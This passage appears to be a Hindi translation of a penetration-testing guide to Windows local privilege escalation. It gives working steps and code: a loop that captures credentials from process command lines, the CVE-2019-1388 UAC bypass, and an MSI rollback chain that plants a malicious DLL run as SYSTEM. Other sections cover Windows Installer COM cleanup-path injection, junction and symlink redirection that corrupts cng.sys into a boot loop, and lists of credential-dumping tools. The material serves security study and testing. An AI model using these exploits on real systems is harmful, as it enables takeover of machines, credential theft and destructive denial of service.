जब आपको किसी user के रूप में shell मिलती है, तो scheduled tasks या अन्य processes execute हो रहे हो सकते हैं, जो **command line पर credentials pass करते हैं**। नीचे दी गई script हर दो seconds में process command lines capture करती है और वर्तमान state की तुलना पिछली state से करके कोई भी अंतर output करती है।

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## प्रक्रियाओं से पासवर्ड चुराना

## कम विशेषाधिकार वाले उपयोगकर्ता से NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass तक

यदि आपके पास ग्राफिकल इंटरफ़ेस (कंसोल या RDP के ज़रिए) का ऐक्सेस है और UAC सक्षम है, तो Microsoft Windows के कुछ संस्करणों में किसी कम-विशेषाधिकार वाले उपयोगकर्ता से टर्मिनल या कोई अन्य प्रक्रिया "NT\AUTHORITY SYSTEM" के रूप में चलाना संभव है।

इससे एक ही vulnerability का उपयोग करके विशेषाधिकार बढ़ाना और UAC को bypass करना, दोनों संभव हो जाते हैं। इसके अतिरिक्त, कुछ भी इंस्टॉल करने की ज़रूरत नहीं है और इस प्रक्रिया के दौरान इस्तेमाल किया जाने वाला binary, Microsoft द्वारा हस्ताक्षरित और जारी किया गया है।

प्रभावित सिस्टम में कुछ ये हैं:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

इस vulnerability का exploit करने के लिए, निम्नलिखित चरण पूरे करना आवश्यक है:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

आपके पास इस GitHub repository में सभी आवश्यक फ़ाइलें और जानकारी हैं:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Administrator Medium से High Integrity Level तक / UAC Bypass

**Integrity Levels के बारे में जानने के लिए** इसे पढ़ें:


{{#ref}}
integrity-levels.md
{{#endref}}

फिर **UAC और UAC bypasses के बारे में जानने के लिए** इसे पढ़ें:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Served Root में Upload Directory Junctions

कोई application एक अनुमानित upload subdirectory बना सकती है, उसमें caller द्वारा दिया गया filename लिख सकती है, और फिर फ़ाइल को process कर सकती है। अगर कम privilege वाला user server-side write से पहले उस subdirectory को हटाकर उसकी जगह NTFS junction बना सकता है, तो write junction के ज़रिए web-served directory में जा सकता है। वहाँ रखी गई script web-service identity के तौर पर चल सकती है, यदि server उस file type को execute करता हो। यह application-विशिष्ट arbitrary-write boundary है; केवल writable upload directory या मौजूदा junction से यह साबित नहीं होता।

Upload handler में path निर्माण और timing, subdirectory पर user के प्रभावी delete/create rights, destination के प्रभावी ACLs, writer द्वारा reparse points follow किए जाने, और उस destination में web server द्वारा files execute किए जाने की जाँच करें। Writer और web server की process identities की अलग-अलग पुष्टि करें। Passive inventory directory ACLs और reparse metadata दिखा सकती है, लेकिन handler का व्यवहार या भविष्य में junction swap होने की पुष्टि नहीं कर सकती। यदि execution किसी service account के रूप में होता है, तो किसी अलग token-privilege path पर विचार करने से पहले **actual process token** की जाँच करें।

## WNF-triggered privileged scheduled-task cleanup

ऐसा scheduled task जो manual execution की अनुमति नहीं देता, फिर भी unprivileged trigger उजागर कर सकता है। किसी privileged task का audit करते समय, उसका XML export करें और task DACL, principal तथा action के साथ **सभी** triggers की जाँच करें। विशेष रूप से, `WnfStateChangeTrigger` किसी Windows Notification Facility (WNF) state का नाम बताता है; यदि उस securable state में current user को update publish करने की अनुमति है, तो `<AllowStartOnDemand>false</AllowStartOnDemand>` होने के बावजूद user task को उसकी configured identity के तहत अप्रत्यक्ष रूप से शुरू कर सकता है।<sup>[[43]](#references)</sup>

उदाहरण के लिए, Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` task SYSTEM के रूप में चलता था, standard user से WNF state `7508BCA32C079E41` में updates स्वीकार करता था, और Recall disabled होने पर भी `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` की जाँच करता था।<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

पहुँच-योग्यता जाँचने के लिए, `ntdll.dll` से `ZwUpdateWnfStateData` resolve करें, आठ-बाइट वाले state name के लिए खाली update सबमिट करें, और return status का मिलान task के last-run data या Procmon activity से करें। नीचे दिया गया छोटा probe Recall task के उदाहरण से byte sequence का उपयोग करता है; जाँचे जा रहे task के लिए export किए गए bytes का उपयोग करें।<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Recursive cleanup को privileged deletion में बदलना

उपयोगी primitive केवल trigger नहीं, बल्कि ऐसा privileged cleanup routine है जो attacker-controlled directory स्वीकार करता है। Enumeration से लेकर अंतिम mutation तक ऑपरेशन को trace करें: profile/session discovery, wildcard-selected children, `SHCreateItemFromParsingName`, और `IFileOperation::DeleteItem इस बात के मज़बूत संकेत हैं कि पहले जाँचे गए pathname को बाद में recursively traverse किया जाएगा। यदि descendants को trusted directory handles के सापेक्ष open करके deletion से पहले validate नहीं किया जाता, तो attacker enumeration और उपयोग के बीच resolution बदल सकता है।<sup>[[43]](#references)</sup>

नीचे बताए गए [oplock, junction और Object Manager symlink substitution](#from-folder-contents-delete-to-system-eop) के साथ WNF trigger का उपयोग करें: oplock, cleaner द्वारा legitimate child चुनने के बाद उसे रोकता है, जबकि writable ancestor को बदल दिया जाता है, ताकि privileged delete दोबारा शुरू होने पर `\RPC Control` के ज़रिए protected target तक पहुँचे। Recall chain में इससे SYSTEM द्वारा `C:\Config.Msi` को delete करना संभव हुआ, जो documented MSI rollback technique के लिए आवश्यक था।<sup>[[31]](#references)[[43]](#references)</sup>

### Nested descendants, shallow reparse-point fixes को bypass करते हैं

केवल attacker-controlled root और उसके immediate child को validate करने से recursive pathname-based delete सुरक्षित नहीं होता। जाँचे गए objects को legitimate रहने दें और junction/oplock substitution को उनके नीचे मौजूद किसी अतिरिक्त child में ले जाएँ; `IFileOperation::DeleteItem` अंततः उस unvalidated descendant तक पहुँचता है और उसके नए target को follow करता है। CVE-2026-20941 ठीक इसी तरह के अधूरे fix के कारण सामने आया: पहले Recall patch ने `UKP` और GUID-जैसी directory को validate किया, लेकिन पुराना recursive deletion operation बरकरार रखा।<sup>[[43]](#references)</sup>

सुरक्षित तरीका यह है कि **हर descendant** को पहले से trusted directory handle के सापेक्ष open करें, अंतिम resolved path/object प्राप्त करके verify करें, और deletion disposition उसी verified handle पर लागू करें। किसी prefix को validate करने के बाद recursive path-based deletion पर वापस न जाएँ। Patch review के दौरान वास्तविक call site पर मौजूद structures भी जाँचें: इस मामले में, `NtCreateFile` पर `OBJECT_ATTRIBUTES` के runtime inspection से non-null `RootDirectory` और relative `{GUID}\\secure_file.lock` name दिखा, जिससे decompiler के उस भ्रामक output का खंडन हुआ जिसमें दूसरे `FILE_DELETE_ON_CLOSE` primitive का संकेत था।<sup>[[43]](#references)</sup>

## Arbitrary Folder Delete/Move/Rename से SYSTEM EoP तक

इस technique का वर्णन [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) में किया गया है और exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs) पर है।<sup>[[31]](#references)[[32]](#references)</sup>

इस attack में Windows Installer के rollback feature का दुरुपयोग करके uninstallation process के दौरान legitimate files को malicious files से बदला जाता है। इसके लिए attacker को एक **malicious MSI installer** बनाना होता है, जिसका उपयोग `C:\Config.Msi` folder को hijack करने के लिए किया जाएगा। बाद में Windows Installer, अन्य MSI packages को uninstall करते समय rollback files को इसी folder में store करेगा; इन rollback files को malicious payload शामिल करने के लिए बदल दिया जाएगा।

### Windows Installer COM cleanup-path injection (CVE-2025-27727)

एक low-privileged client, `CMsiConfigurationManager` COM object (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`) के ज़रिए SYSTEM `msiexec.exe` service तक पहुँच सकता है। Reverse engineering से संबंधित `IMsiServer` calls की पहचान vtable offset `0xA0` पर `MsiBeginTransactionW`, `0xC8` पर `SetEEUIDirectoryAndFilter`, और `0x50` पर `CleanupTempPackages` के रूप में हुई। ये names और offsets reverse-engineered हैं और अलग-अलग builds में बदल सकते हैं।<sup>[[41]](#references)</sup>

Non-administrator के लिए, `SetEEUIDirectoryAndFilter` caller द्वारा दिया गया path `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS`, और `FILE_FLAG_OPEN_REPARSE_POINT` के साथ खोलते समय ही caller का impersonate करता है। इससे साबित होता है कि caller directory delete कर सकता है और reparse point को follow करने से बचा जा सकता है, लेकिन इससे जाँचे गए file object को बाद के cleanup से bind नहीं किया जाता और न ही यह साबित होता है कि Windows Installer ने उसे बनाया था।<sup>[[41]](#references)</sup>

`MsiBeginTransactionW` के बाद, `SetEEUIDirectoryAndFilter` caller के filter argument की परवाह किए बिना path को folder के रूप में schedule करता है। Service, `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages` के अंतर्गत एक named `REG_DWORD` value लिखती है: value name caller-controlled path होता है और data `0x00000002` folder flag होता है। इसके बाद `CleanupTempPackages(NULL, FALSE)` सीधे cleanup शुरू करता है। इसका elevated worker registry values enumerate करता है और folder entries को path provenance जाँचे बिना recursive `FDeleteFolder` को सौंप देता है। यदि सामान्य removal विफल हो जाए, तो code `LockdownPath` भी call करता है, file attributes clear करता है और दोबारा कोशिश करता है।<sup>[[41]](#references)</sup>

`msi.dll` से प्राप्त न्यूनतम call sequence यह है:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

उपयोगी primitive junction redirect के बजाय path reuse है। हमलावर द्वारा बनाया गया `C:\Config.Msi` रजिस्टर करें, उसे हटाएँ, और Windows Installer को बाद में protected rollback data के साथ उसी pathname को फिर से बनाने दें। Cleanup पुराने `TempPackages` नाम पर भरोसा करता है और नई directory को SYSTEM के रूप में हटा देता है। इससे `FILE_FLAG_OPEN_REPARSE_POINT` और redirection-trust mitigation द्वारा बनाई गई intended boundary को bypass किया जा सकता है, क्योंकि किसी reparse point की आवश्यकता नहीं होती।<sup>[[41]](#references)</sup>

यह deletion primitive नीचे दी गई rollback chain में काम आता है: अलग `Installer\Folders` record को बनाए रखें, protected `C:\Config.Msi` को हटाएँ, उसे NULL DACL के साथ फिर से बनाएँ, और Installer द्वारा DACL को harden करने से पहले `WRITE_DAC` की अनुमति वाला handle बनाए रखें। पहले से खोला गया handle `NtSetSecurityObject` के ज़रिए permissive DACL बहाल कर सकता है, जिसके बाद rollback फिर से शुरू होने से पहले बनाए गए `.rbs` को बदला जा सकता है।<sup>[[41]](#references)</sup>

Microsoft ने इस path को ठीक करने के लिए नई feature gate सक्षम होने पर `CMsiTransaction::SetEEUIDirectoryAndFilter` को `ScheduleFileOrFolderDelete` कॉल करने से रोका। COM call अब भी success लौटा सकती है, लेकिन attacker-controlled path को `TempPackages` में नहीं डालती। सफल method return को patch का प्रमाण मानने के बजाय April 2025 Windows security updates लागू करें।<sup>[[41]](#references)[[42]](#references)</sup>

संक्षेप में, technique इस प्रकार है:

1. **चरण 1 – Hijack की तैयारी (`C:\Config.Msi` को खाली छोड़ें)**

- चरण 1: MSI इंस्टॉल करें
    - एक `.msi` बनाएँ, जो writable folder (`TARGETDIR`) में harmless file (जैसे `dummy.txt`) इंस्टॉल करे।
    - Installer को **"UAC Compliant"** के रूप में चिह्नित करें, ताकि **non-admin user** इसे चला सके।
    - इंस्टॉल के बाद file पर **handle** खुला रखें।

- चरण 2: Uninstall शुरू करें
    - उसी `.msi` को uninstall करें।
    - Uninstall process files को `C:\Config.Msi` में ले जाना और उनका नाम बदलकर `.rbf` files (rollback backups) करना शुरू करता है।
    - यह पता लगाने के लिए `GetFinalPathNameByHandle` से खुले file handle को **poll** करें कि file कब `C:\Config.Msi\<random>.rbf` बनती है।

- चरण 3: Custom Syncing
    - `.msi` में एक **custom uninstall action (`SyncOnRbfWritten`)** शामिल है, जो:
        - `.rbf` लिखे जाने पर signal देता है।
        - फिर uninstall जारी रखने से पहले किसी दूसरे event का **इंतज़ार करता है**।

- चरण 4: `.rbf` को हटने से रोकें
    - Signal मिलने पर, `.rbf` file को `FILE_SHARE_DELETE` के बिना **खोलें** — इससे उसे **हटाया नहीं जा सकता**।
    - फिर वापस signal दें, ताकि uninstall पूरा हो सके।
    - Windows Installer `.rbf` को हटाने में विफल रहता है, और क्योंकि वह सभी contents नहीं हटा पाता, इसलिए **`C:\Config.Msi` नहीं हटता**।

- चरण 5: `.rbf` को मैन्युअल रूप से हटाएँ
    - आप (attacker) `.rbf` file को मैन्युअल रूप से हटाएँ।
    - अब **`C:\Config.Msi` खाली है** और hijack के लिए तैयार है।

> इस बिंदु पर, `C:\Config.Msi` को हटाने के लिए **SYSTEM-level arbitrary folder delete vulnerability को trigger करें**।

2. **चरण 2 – Rollback Scripts को Malicious Scripts से बदलना**

- चरण 6: कमजोर ACLs के साथ `C:\Config.Msi` फिर से बनाएँ
    - `C:\Config.Msi` folder को स्वयं फिर से बनाएँ।
    - **कमज़ोर DACLs** (जैसे Everyone:F) सेट करें और `WRITE_DAC` के साथ **एक handle खुला रखें**।

- चरण 7: एक और Install चलाएँ
    - `.msi` को फिर से इंस्टॉल करें, इन सेटिंग्स के साथ:
        - `TARGETDIR`: Writable location।
        - `ERROROUT`: ऐसा variable जो forced failure trigger करे।
    - इस install का उपयोग फिर से **rollback** trigger करने के लिए होगा, जो `.rbs` और `.rbf` पढ़ता है।

- चरण 8: `.rbs` पर नज़र रखें
    - `C:\Config.Msi` को monitor करने के लिए `ReadDirectoryChangesW` इस्तेमाल करें, जब तक कोई नया `.rbs` न दिखे।
    - उसका filename कैप्चर करें।

- चरण 9: Rollback से पहले Sync करें
    - `.msi` में एक **custom install action (`SyncBeforeRollback`)** शामिल है, जो:
        - `.rbs` बनते ही एक event signal करता है।
        - फिर आगे बढ़ने से पहले **इंतज़ार करता है**।

- चरण 10: कमजोर ACL फिर से लागू करें
    - `.rbs created` event मिलने के बाद:
        - Windows Installer `C:\Config.Msi` पर **मज़बूत ACLs फिर से लागू करता है**।
        - लेकिन चूँकि आपके पास अब भी `WRITE_DAC` वाला handle है, आप **कमज़ोर ACLs फिर से लागू कर सकते हैं**।

> ACLs **केवल handle खोलते समय लागू होते हैं**, इसलिए आप अब भी folder में लिख सकते हैं।

- चरण 11: Fake `.rbs` और `.rbf` रखें
    - `.rbs` file को एक **fake rollback script** से overwrite करें, जो Windows को यह करने का निर्देश देती है:
        - आपकी `.rbf` file (malicious DLL) को किसी **privileged location** (जैसे `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`) में restore करे।
    - एक fake `.rbf` रखें, जिसमें **malicious SYSTEM-level payload DLL** हो।

- चरण 12: Rollback trigger करें
    - Installer को आगे बढ़ाने के लिए sync event signal करें।
    - एक **type 19 custom action (`ErrorOut`)** को किसी ज्ञात बिंदु पर install को **जानबूझकर विफल करने** के लिए configure किया गया है।
    - इससे **rollback शुरू होता है**।

- चरण 13: SYSTEM आपका DLL इंस्टॉल करता है
    - Windows Installer:
        - आपका malicious `.rbs` पढ़ता है।
        - आपके `.rbf` DLL को target location में कॉपी करता है।
    - अब आपका **malicious DLL, SYSTEM द्वारा load किए जाने वाले path में** है।

- अंतिम चरण: SYSTEM code चलाएँ
    - ऐसा trusted **auto-elevated binary** चलाएँ (जैसे `osk.exe`), जो आपके hijack किए गए DLL को load करे।
    - **धमाका**: आपका code **SYSTEM के रूप में execute होता है**।


### Arbitrary File Delete/Move/Rename से SYSTEM EoP तक

मुख्य MSI rollback technique (पिछली वाली) यह मानती है कि आप **पूरा folder** (जैसे `C:\Config.Msi`) हटा सकते हैं। लेकिन अगर आपकी vulnerability केवल **arbitrary file deletion** की अनुमति देती है, तो क्या होगा?

आप **NTFS internals** का exploitation कर सकते हैं: हर folder में एक hidden alternate data stream होता है, जिसका नाम है:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

यह stream फ़ोल्डर का **index metadata** संग्रहीत करता है।

इसलिए, यदि आप किसी फ़ोल्डर की **`::$INDEX_ALLOCATION` stream** को **delete** करते हैं, तो NTFS फ़ाइल सिस्टम से **पूरा फ़ोल्डर हटा देता है**।

आप यह काम standard file deletion APIs का उपयोग करके कर सकते हैं, जैसे:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> भले ही आप *file* delete API को call कर रहे हों, यह **खुद folder को delete करता है**।

### Folder Contents Delete से SYSTEM EoP तक
अगर आपका primitive आपको मनमानी files/folders delete करने की अनुमति नहीं देता, लेकिन **attacker-controlled folder के *contents* delete करने की अनुमति देता है**, तो क्या होगा?

1. Step 1: एक bait folder और file सेटअप करें
- बनाएँ: `C:\temp\folder1`
- इसके अंदर: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` पर **oplock** लगाएँ
- जब कोई privileged process `file1.txt` delete करने की कोशिश करता है, तो oplock **execution को pause कर देता है**।

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Step 3: SYSTEM process ट्रिगर करें (जैसे, `SilentCleanup`)
- यह process folders (जैसे, `%TEMP%`) को scan करता है और उनकी सामग्री delete करने की कोशिश करता है।
- जब यह `file1.txt` तक पहुँचता है, तो **oplock ट्रिगर होता है** और control आपके callback को सौंप देता है।

4. Step 4: oplock callback के अंदर – deletion को redirect करें

- Option A: `file1.txt` को कहीं और move करें
    - इससे `folder1` खाली हो जाता है और oplock टूटता नहीं है।
    - `file1.txt` को सीधे delete न करें — इससे oplock समय से पहले release हो जाएगा।

- Option B: `folder1` को **junction** में बदलें:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- विकल्प C: `\RPC Control` में एक **symlink** बनाएँ:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> यह NTFS की उस आंतरिक stream को निशाना बनाता है जो फ़ोल्डर का metadata संग्रहीत करती है — इसे delete करने से फ़ोल्डर delete हो जाता है।

5. चरण 5: oplock रिलीज़ करें
- SYSTEM process जारी रहता है और `file1.txt` को delete करने की कोशिश करता है।
- लेकिन अब, junction + symlink की वजह से, यह वास्तव में delete कर रहा है:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**परिणाम**: `C:\Config.Msi` को SYSTEM द्वारा डिलीट कर दिया जाता है।

### किसी भी फ़ोल्डर को बनाने से स्थायी DoS तक

ऐसे primitive का exploit करें जो आपको **SYSTEM/admin के रूप में कोई भी फ़ोल्डर बनाने** देता है — भले ही **आप फ़ाइलें नहीं लिख सकते** या **कमज़ोर permissions सेट नहीं कर सकते**।

**critical Windows driver** के नाम से एक **फ़ोल्डर** (फ़ाइल नहीं) बनाएँ, उदाहरण के लिए:
```
C:\Windows\System32\cng.sys
```

- यह पथ आमतौर पर `cng.sys` kernel-mode driver से संबंधित होता है।
- यदि आप इसे **पहले से एक folder के रूप में बना देते हैं**, तो Windows boot के दौरान वास्तविक driver लोड नहीं कर पाता।
- फिर, Windows boot के दौरान `cng.sys` लोड करने की कोशिश करता है।
- उसे folder दिखाई देता है, **वास्तविक driver का पता नहीं लगा पाता**, और **crash हो जाता है या boot रुक जाता है**।
- **कोई fallback नहीं होता**, और बाहरी हस्तक्षेप (जैसे boot repair या disk access) के बिना **कोई recovery नहीं होती**।

### Privileged log/backup paths + OM symlinks से arbitrary file overwrite / boot DoS तक

जब कोई **privileged service** किसी **writable config** से पढ़े गए path पर logs/exports लिखती है, तो उस path को **Object Manager symlinks + NTFS mount points** से redirect करके privileged write को arbitrary overwrite में बदला जा सकता है (**SeCreateSymbolicLinkPrivilege के बिना भी**)।<sup>[[15]](#references)</sup>

**आवश्यकताएँ**
- Target path रखने वाला config attacker के लिए writable हो (जैसे, `%ProgramData%\...\.ini`)।
- `\RPC Control` पर mount point और OM file symlink बनाने की क्षमता (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools))।<sup>[[16]](#references)[[17]](#references)</sup>
- ऐसा privileged operation जो उस path पर लिखता हो (log, export, report)।

**उदाहरण chain**
1. Privileged log destination पाने के लिए config पढ़ें, जैसे `C:\ProgramData\ICONICS\IcoSetup64.ini` में `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`।
2. बिना admin के path redirect करें:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. privileged component द्वारा log लिखे जाने की प्रतीक्षा करें (जैसे, admin द्वारा “टेस्ट SMS भेजें” trigger करना)। अब write `C:\Windows\System32\cng.sys` में होगी।
4. overwritten target का निरीक्षण करें (hex/PE parser) और corruption की पुष्टि करें; reboot करने पर Windows tampered driver path को load करेगा → **boot loop DoS**। यह उन सभी protected files पर भी लागू होता है जिन्हें कोई privileged service write करने के लिए खोलेगी।

> `cng.sys` सामान्यतः `C:\Windows\System32\drivers\cng.sys` से load होता है, लेकिन अगर उसकी एक copy `C:\Windows\System32\cng.sys` में मौजूद हो, तो पहले उसे आज़माया जा सकता है। इससे यह corrupt data के लिए एक भरोसेमंद DoS sink बन जाता है।



## **High Integrity से System तक**

### **नई service**

अगर आप पहले से ही किसी High Integrity process में चल रहे हैं, तो **SYSTEM तक पहुँचने का रास्ता** आसान हो सकता है: बस एक नई service **बनाकर उसे execute करें**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Service binary बनाते समय सुनिश्चित करें कि वह एक valid service हो या binary आवश्यक actions जल्दी करे, क्योंकि valid service न होने पर उसे 20s में kill कर दिया जाएगा।

### AlwaysInstallElevated

High Integrity process से आप **AlwaysInstallElevated registry entries enable** करने और _**.msi**_ wrapper का उपयोग करके reverse shell **install** करने की कोशिश कर सकते हैं।\
[इसमें शामिल registry keys और _.msi_ package install करने के तरीके की अधिक जानकारी यहाँ है।](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**आप** [**code यहाँ पा सकते हैं**](seimpersonate-from-high-to-system.md)**।**

### SeDebug + SeImpersonate से Full Token privileges तक

अगर आपके पास वे token privileges हैं (संभवतः आपको ये पहले से High Integrity process में मिलेंगी), तो आप SeDebug privilege के साथ **लगभग कोई भी process** (protected processes नहीं) **open** कर पाएँगे, उस process का **token copy** कर पाएँगे और उस token के साथ एक **arbitrary process create** कर पाएँगे।\
इस technique में आमतौर पर **SYSTEM के रूप में चल रहे किसी भी process को चुनते हैं, जिसमें सभी token privileges हों** (_हाँ, आपको ऐसे SYSTEM processes मिल सकते हैं जिनमें सभी token privileges नहीं होतीं_)।\
**प्रस्तावित technique को execute करने वाले code का** [**उदाहरण यहाँ देखें**](sedebug-+-seimpersonate-copy-token.md)**।**

### **Named Pipes**

इस technique का उपयोग meterpreter, `getsystem` में escalate करने के लिए करता है। इस technique में **एक pipe create करना और फिर उस pipe पर write करने के लिए service create/abuse करना** शामिल है। फिर, **`SeImpersonate`** privilege का उपयोग करके pipe create करने वाला **server**, pipe client (service) के **token को impersonate** कर पाएगा और SYSTEM privileges प्राप्त कर सकेगा।\
अगर आप [**name pipes के बारे में और जानना चाहते हैं, तो इसे पढ़ें**](#named-pipe-client-impersonation)।\
अगर आप [**name pipes का उपयोग करके high integrity से System तक पहुँचने का उदाहरण पढ़ना चाहते हैं, तो इसे पढ़ें**](from-high-integrity-to-system-with-name-pipes.md)।

### Dll Hijacking

अगर आप **SYSTEM** के रूप में चल रहे किसी **process** द्वारा **load** की जा रही **dll को hijack** कर पाते हैं, तो आप उन permissions के साथ arbitrary code execute कर पाएँगे। इसलिए Dll Hijacking इस तरह के privilege escalation के लिए भी उपयोगी है। इसके अलावा, **high integrity process से इसे करना और भी आसान है**, क्योंकि उस process को dlls load करने के लिए इस्तेमाल किए जाने वाले folders पर **write permissions** मिलेंगी।\
**आप** [**Dll hijacking के बारे में यहाँ और जान सकते हैं**](dll-hijacking/index.html)**।**

### **Administrator या Network Service से System तक**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### LOCAL SERVICE या NETWORK SERVICE से full privs तक

**पढ़ें:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## और मदद

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## उपयोगी tools

**Windows local privilege escalation vectors खोजने के लिए सबसे अच्छा tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurations और sensitive files की जाँच करें (**[**यहाँ देखें**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**)। Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- कुछ संभावित misconfigurations की जाँच करें और जानकारी इकट्ठा करें (**[**यहाँ देखें**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**)।**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurations की जाँच करें**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- यह PuTTY, WinSCP, SuperPuTTY, FileZilla और RDP की saved session जानकारी निकालता है। local पर -Thorough का उपयोग करें।**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager से credentials निकालता है। Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- इकट्ठा किए गए passwords को पूरे domain में spray करें**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh एक PowerShell ADIDNS/LLMNR/mDNS spoofer और man-in-the-middle tool है।**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- बुनियादी privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- ज्ञात privesc vulnerabilities खोजें (Watson के लिए DEPRECATED)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Admin rights आवश्यक हैं)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- ज्ञात privesc vulnerabilities खोजें (VisualStudio का उपयोग करके compile करना आवश्यक है) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- misconfigurations खोजने के लिए host की enumeration करता है (यह privesc से ज़्यादा जानकारी इकट्ठा करने वाला tool है) (compile करना आवश्यक है) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- कई software से credentials निकालता है (github पर precompiled exe उपलब्ध है)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp का C# में port**\
